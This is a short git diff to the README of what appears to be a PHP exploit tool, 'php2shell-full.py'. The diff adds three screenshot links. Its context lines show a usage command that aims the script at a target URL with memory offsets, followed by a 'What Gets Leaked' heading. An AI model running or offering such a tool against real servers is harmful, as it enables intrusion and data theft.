@@ -140,6 +140,12 @@ For a different PHP build, supply your offsets:
 python3 php2shell-full.py -u http://TARGET/index.php \
   --dtor-offset 0xABCDEF --zif-offset 0x123456 --calibrate
 ```
+<img width="949" height="625" alt="Screenshot 2026-10-23 at 1 12 12 pm" src="https://github.com/user-attachments/assets/ce7d8a92-979b-46ee-ab6e-221959ee1dce" />
+
+<img width="1373" height="1010" alt="Screenshot 2026-10-23 at 1 15 27 pm" src="https://github.com/user-attachments/assets/3a2bde72-1c2b-4b71-a3af-9edf09ec841d" />
+
+<img width="1380" height="838" alt="Screenshot 2026-10-23 at 1 12 38 pm" src="https://github.com/user-attachments/assets/afef6008-1a90-442e-8bf0-6aa648171e0b" />
+
 
 ## What Gets Leaked
 
